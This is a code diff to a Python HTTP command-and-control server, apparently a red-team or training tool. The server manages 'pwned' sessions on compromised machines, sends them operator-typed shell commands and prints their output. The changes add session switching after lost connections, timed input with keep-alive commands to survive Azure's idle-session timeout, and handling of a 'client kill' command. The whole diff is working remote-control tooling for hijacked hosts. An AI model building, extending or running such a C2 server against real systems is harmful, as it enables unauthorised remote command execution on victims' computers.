@@ -3,7 +3,47 @@ from colorama import Fore
 from urllib.parse import unquote_plus
 
 #Constants Variables Imports
-from settings import CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, BIND_ADDR, PORT
+from settings import CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD ,RESPONSE, RESPONSE_KEY, BIND_ADDR, PORT
+
+from inputimeout import inputimeout, TimeoutOccurred
+
+def get_new_session():
+    """Function to check if other sessions exist if none do Re-Initialize variables.
+	However, if sessions do exist, Allow the Red Team operator to pick one to become a new active session"""
+
+    # this variables must be global, as they will often be updated via multiple session
+    global activeSession, pwnedDict, pwnedId
+    # Delete Lost Connection Client from pwnedDict
+    del pwnedDict[activeSession]
+
+    # If pwnedDict is empty, Re initialize pwnedId & activeSession
+    if not pwnedDict:
+        print(Fore.LIGHTBLUE_EX+ "[...] Waiting for a new Connection!" + Fore.RESET)
+        pwnedId = 0
+        activeSession = 1
+    # if pwnedDict have items, print it on display to choose active session and switch to it
+    else:
+        #display sessions in our dictionary and choose one of them to switch over to
+        while True:
+            print(*pwnedDict.items(), sep='\n')
+            try:
+                newSession = int(input("\n[+] Choose Session Number to Make it Active => "))
+            except ValueError:
+                print(Fore.LIGHTRED_EX + "\n[-] Enter Number Only; You must choose a pwned ID of "
+                                         "one of the sessions show on the Screen\n" + Fore.RESET)
+                continue
+            # Ensure entered pwnedId exists in pwnedDict and set activeSession to it
+            if newSession in pwnedDict:
+                activeSession = newSession
+                print(Fore.LIGHTGREEN_EX + f"[+] Active Session has been Set on: "
+                                          f"{pwnedDict[activeSession]}\n" + Fore.RESET)
+                break
+            # if newSession not in pwnedDict actually wrong chosen number
+            else:
+                print(Fore.LIGHTRED_EX + "\nWrong Choose; You must choose a pwned ID of one "
+                      "of the sessions show on the Screen\n")
+                continue
+
 
 class C2Handler(BaseHTTPRequestHandler):
     """This class is a child of the BaseHTTPRequestHandler class.
@@ -18,7 +58,7 @@ class C2Handler(BaseHTTPRequestHandler):
         """this method handles all http GET Requests arrived at the C2 server.
         first send 404 status codes"""
         
-        global activeSession, clientAccount, clientHostname, pwnedId, pwnedDict
+        global activeSession, clientAccount, clientHostname, pwnedId, pwnedDict, cwd
         
         if self.path.startswith(CMD_REQUEST):
             client = self.path.split(CMD_REQUEST)[1]
@@ -47,9 +87,20 @@ class C2Handler(BaseHTTPRequestHandler):
             
             # If the client in pwnedDict and also is Active Session    
             elif client == pwnedDict[activeSession]:
-                # Collect Command from input to run on the client
-                command = input(Fore.RESET+f"({clientIp}){clientAccount}@{clientHostname}:{cwd}> "+Fore.LIGHTYELLOW_EX)
-                print(Fore.RESET)
+                # if INPUT_TIMEOUT is set, run inputimeout instead of regular input
+                if INPUT_TIMEOUT:
+                    try:
+                        # Azure kill a waiting HTTP GET Session after 4 minutes(230 seconds in Windows & 240 in Linux)
+					    # so we must handle input with a timeout as below
+                        command = inputimeout(f"({clientIp}){clientAccount}@{clientHostname}:{cwd} => ",
+                                              timeout=INPUT_TIMEOUT)
+                    # if a timeout Occurs on our input, do a simple command to trigger a new session
+                    except TimeoutOccurred:
+                        command = KEEP_ALIVE_CMD
+                else:
+                    # Collect Command from regular input to run on the c2 client
+                    command = input(Fore.RESET+f"({clientIp}){clientAccount}@{clientHostname}:{cwd} => "+Fore.LIGHTYELLOW_EX)
+                    print(Fore.RESET)
 
                 # Send 200 status codes Write the Command back to the client as a Response; must use UTF-8 for encoding
                 try:
@@ -60,39 +111,9 @@ class C2Handler(BaseHTTPRequestHandler):
                     self.wfile.write(command.encode())
                 except BrokenPipeError:
                     # Print lost connection message
+                    cwd = "~"
                     print(Fore.RED + f"[!] Lost Connection to {pwnedDict[activeSession]}. \n" + Fore.RESET)
-
-                    # Delete Lost Connection Client from pwnedDict
-                    del pwnedDict[activeSession]
-
-                    # If pwnedDict is empty, Re initialize pwnedId & activeSession
-                    if not pwnedDict:
-                        print(Fore.LIGHTBLUE_EX+ "[...] Waiting for a new Connection!" + Fore.RESET)
-                        pwnedId = 0
-                        activeSession = 1
-                    # if pwnedDict have items, print it on display to choose active session and switch to it
-                    else:
-                        #display sessions in our dictionary and choose one of them to switch over to
-                        while True:
-                            print(*pwnedDict.items(), sep='\n')
-                            try:
-                                newSession = int(input("\n[+] Choose Session Number to Make it Active => "))
-                            except ValueError:
-                                print(Fore.LIGHTRED_EX + "\n[-] Enter Number Only; You must choose a pwned ID of "
-                                                         "one of the sessions show on the Screen\n" + Fore.RESET)
-                                continue
-                            # Ensure entered pwnedId exists in pwnedDict and set activeSession to it
-                            if newSession in pwnedDict:
-                                activeSession = newSession
-                                print(Fore.LIGHTGREEN_EX + f"[+] Active Session has been Set on: "
-                                                          f"{pwnedDict[activeSession]}\n" + Fore.RESET)
-                                break
-                            # if newSession not in pwnedDict actually wrong chosen number
-                            else:
-                                print(Fore.LIGHTRED_EX + "\nWrong Choose; You must choose a pwned ID of one "
-                                      "of the sessions show on the Screen\n")
-                                continue
-
+                    get_new_session()
                 # Handle KeyboardInterrupt
                 except KeyboardInterrupt:
                     print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Server"+Fore.RESET)
@@ -100,7 +121,11 @@ class C2Handler(BaseHTTPRequestHandler):
                 # Handle Unknown & Other Errors
                 except Exception as e:
                     print(Fore.LIGHTRED_EX+"[!] Unknown Error when Sending Command to C2 Client\n"+Fore.RESET)
-                    print(f'Error Content:\n{e}')    
+                    print(f'Error Content:\n{e}')
+
+                # If we have just killed a client, try to get a new session to set it active
+                if command.startswith("client kill"):
+                    get_new_session()
             
             # if client in the pwnedDict but is Not Active Session
             else:
@@ -114,6 +139,8 @@ class C2Handler(BaseHTTPRequestHandler):
         if self.path == RESPONSE:
             # Print Result of stdout arrived from the client in Plain Text format
             print(self.handle_post_data())
+
+
 
         # Follow code when a compromised Computer is responding with the current directory
         elif self.path == CWD_RESPONSE:
